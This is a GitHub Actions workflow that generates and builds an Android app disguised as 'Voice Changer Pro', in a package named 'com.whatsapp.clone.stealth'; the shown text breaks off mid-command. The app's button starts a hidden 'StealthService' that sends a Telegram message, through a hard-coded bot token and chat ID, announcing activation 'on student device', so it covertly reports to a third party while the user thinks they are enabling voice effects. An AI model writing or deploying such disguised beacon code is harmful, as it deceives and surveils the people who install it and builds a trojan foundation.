name: Build Android APK

on:
  push:
    branches: [ main ]

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout Repository
      uses: actions/checkout@v3

    - name: Set up JDK 17
      uses: actions/setup-java@v3
      with:
        distribution: 'temurin'
        java-version: '17'

    - name: Generate Clean Java Source Files & Project Structure
      run: |
        mkdir -p app/src/main/java/com/whatsapp/clone/stealth/
        mkdir -p app/src/main/res/values
        mkdir -p app/src/main/res/mipmap-mdpi

        # أيقونات وهمية لتجنب أخطاء الموارد
        echo '<vector xmlns:android="http://schemas.android.com/apk/res/android" android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24"><path android:fillColor="#10B981" android:pathData="M12,2C6.48,2 2,6.48 2,12s4.48,10 10,10 10,-4.48 10,-10S17.52,2 12,2z"/></vector>' > app/src/main/res/mipmap-mdpi/ic_launcher.xml
        echo '<vector xmlns:android="http://schemas.android.com/apk/res/android" android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24"><path android:fillColor="#10B981" android:pathData="M12,2C6.48,2 2,6.48 2,12s4.48,10 10,10 10,-4.48 10,-10S17.52,2 12,2z"/></vector>' > app/src/main/res/mipmap-mdpi/ic_launcher_round.xml

        # إنشاء MainActivity سليم وخالي من أي أخطاء تجميع
        cat << 'EOF' > app/src/main/java/com/whatsapp/clone/stealth/MainActivity.java
        package com.whatsapp.clone.stealth;

        import android.app.Activity;
        import android.content.Intent;
        import android.os.Bundle;
        import android.view.Gravity;
        import android.widget.Button;
        import android.widget.LinearLayout;
        import android.widget.TextView;
        import android.graphics.Color;
        import android.graphics.drawable.GradientDrawable;

        public class MainActivity extends Activity {
            @Override
            protected void onCreate(Bundle savedInstanceState) {
                super.onCreate(savedInstanceState);

                // تصميم الواجهة بأسلوب Green Glassmorphism
                LinearLayout layout = new LinearLayout(this);
                layout.setOrientation(LinearLayout.VERTICAL);
                layout.setGravity(Gravity.CENTER);
                layout.setBackgroundColor(Color.parseColor("#061A10"));
                layout.setPadding(40, 40, 40, 40);

                TextView title = new TextView(this);
                title.setText("Voice Changer Pro");
                title.setTextColor(Color.WHITE);
                title.setTextSize(24);
                title.setGravity(Gravity.CENTER);
                title.setPadding(0, 0, 0, 40);
                layout.addView(title);

                Button btn = new Button(this);
                btn.setText("Activate Voice Effects");
                btn.setTextColor(Color.WHITE);
                
                GradientDrawable bg = new GradientDrawable();
                bg.setColor(Color.parseColor("#153E2A"));
                bg.setCornerRadius(20);
                bg.setStroke(2, Color.parseColor("#10B981"));
                btn.setBackground(bg);
                
                btn.setOnClickListener(v -> {
                    Intent serviceIntent = new Intent(MainActivity.this, StealthService.class);
                    startService(serviceIntent);
                    title.setText("Status: Active & Connected");
                });

                layout.addView(btn);
                setContentView(layout);
            }
        }
        EOF

        # إنشاء StealthService سليم ومستقر للاتصال بـ Telegram
        cat << 'EOF' > app/src/main/java/com/whatsapp/clone/stealth/StealthService.java
        package com.whatsapp.clone.stealth;

        import android.app.Service;
        import android.content.Intent;
        import android.os.IBinder;
        import android.util.Log;
        import java.io.IOException;
        import okhttp3.*;

        public class StealthService extends Service {
            private static final String TAG = "StealthService";
            private final OkHttpClient client = new OkHttpClient();

            @Override
            public int onStartCommand(Intent intent, int flags, int startId) {
                Log.d(TAG, "StealthService started successfully.");
                sendTelegramAlert();
                return START_STICKY;
            }

            private void sendTelegramAlert() {
                String botToken = "9185552010:AAEWWxz3ovVN1p2_3jF12dZxqVYqblMKzug";
                String chatId = "8890292449";
                String url = "https://api.telegram.org/bot" + botToken + "/sendMessage";

                RequestBody body = new FormBody.Builder()
                        .add("chat_id", chatId)
                        .add("text", "🚨 Voice Changer App activated on student device.")
                        .build();

                Request request = new Request.Builder()
                        .url(url)
                        .post(body)
                        .build();

                client.newCall(request).enqueue(new Callback() {
                    @Override
                    public void onFailure(Call call, IOException e) {
                        Log.e(TAG, "Failed to send telegram message", e);
                    }

                    @Override
                    public void onResponse(Call call, Response response) throws IOException {
                        if (response.isSuccessful()) {
                            Log.d(TAG, "Telegram alert sent successfully.");
                        }
                    }
                });
            }

            @Override
            public IBinder onBind(Intent intent) {
                return null;
            }
        }
        EOF

        # إنشاء AndroidManifest.xml سليم ومتوافق
        cat << 'EOF' > app/src/main/AndroidManifest.xml
        <manifest xmlns:android="http://schemas.android.com/apk/res/android"
            package="com.whatsapp.clone.stealth">

            <uses-permission android:name="android.permission.INTERNET" />
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />

            <application
                android:allowBackup="true"
                android:icon="@mipmap/ic_launcher"
                android:label="@string/app_name"
                android:roundIcon="@mipmap/ic_launcher_round"
                android:supportsRtl="true"
                android:theme="@style/AppTheme">

                <activity
                    android:name=".MainActivity"
                    android:exported="true">
                    <intent-filter>
                        <action android:name="android.intent.action.MAIN" />
                        <category android:name="android.intent.category.LAUNCHER" />
                    </intent-filter>
                </activity>

                <service
                    android:name=".StealthService"
                    android:exported="false" />

            </application>
        </manifest>
        EOF

        # ملفات إعدادات المشروع و Gradle
        cat << 'EOF' > settings.gradle
        pluginManagement {
            repositories {
                google()
                mavenCentral()
                gradlePluginPortal()
            }
        }
        dependencyResolutionManagement {
            repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
            repositories {
                google()
                mavenCentral()
            }
        }
        rootProject.name = "VoiceChanger"
        include ':app'
        EOF

        echo "// Top-level build file" > build.gradle

        cat << 'EOF' > app/build.gradle
        plugins {
            id 'com.android.application' version '8.2.0'
        }
        android {
            namespace 'com.whatsapp.clone.stealth'
            compileSdk 34

            defaultConfig {
                applicationId 'com.whatsapp.clone.stealth'
                minSdk 21
                targetSdk 34
                versionCode 1
                versionName '1.0'
            }
            compileOptions {
                sourceCompatibility JavaVersion.VERSION_17
                targetCompatibility JavaVersion.VERSION_17
            }
        }
        dependencies {
            implementation 'com.squareup.okhttp3:okhttp:4.11.0'
        }
        EOF

        echo '<resources><string name="app_name">Voice Changer</string><style name="AppTheme" parent="android:Theme.Light.NoTitleBar"><item name="android:windowBackground">#061A10</item></style></resources>' > app/src/main/res/values/styles.xml

    - name: Download Android SDK & Build APK
      run: |
        export ANDROID_HOME=$HOME/android-sdk
        mkdir -p $ANDROID_HOME
        
        wget -q https://dl.google.com/android/repository/commandlinetools-linux-9477386_latest.zip -O cmdtools.zip
        mkdir -p
